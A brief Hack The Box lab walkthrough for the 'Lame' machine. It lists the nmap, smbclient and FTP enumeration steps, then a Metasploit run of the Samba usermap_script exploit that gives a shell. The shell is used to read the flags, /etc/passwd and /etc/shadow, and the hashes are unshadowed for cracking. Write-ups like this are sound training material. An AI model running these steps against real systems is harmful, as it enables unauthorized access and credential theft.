HTB - 2. Lame

1. `nmap -A -T4 -p- 10.10.10.3` takes 144 seconds, 21 (ftp) open with version `vsftpd 2.3.4` and anonymous login allowed, 22 (ssh) open with version `4.7p1 Debian 8ubuntu2`, 139 & 445 (samba) open with version 3.0.20-Debian (workgroup: WORKGROUP), 3632 (distccd v1) with version 4.2.4
2. Samba
	```
	smbclient -L \\\\10.10.10.3\\
	exit
	smbclient -L \\\\10.10.10.3\\tmp
	exit
	smbclient -L \\\\10.10.10.3\\opt
	exit
	smbclient -L \\\\10.10.10.3\\ADMIN$
	```
	Result: Dead end
3. FTP Check
	```
	ftp 10.10.10.3
	anonymous
	anonymous
	ls
	pwd
	```
	Result: In directory `/` which is empty
4. Search `samba 3.0.20-debian exploit`: https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script and [Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)](https://www.exploit-db.com/exploits/16320)
5. Metasploit Exploit
	```
	use exploit/multi/samba/usermap_script
	options
	set rhosts 10.10.10.3
	show targets
	exploit
	whoami
	hostname
	pwd
	ls
	updatedb
	locate root.txt
	locate user.txt
	cat /root/root.txt
	cat /home/makis/user.txt
	cat /etc/passwd
	cat /etc/shadow
	unshadow passwd shadow
	```
	Result: Shell popped and machine owned. Can try to crack passwords with `hashcat`.
6. Search `vsftpd 2.3.4 exploit`: https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor - This is a rapithole; don't continuously try if it doesn't work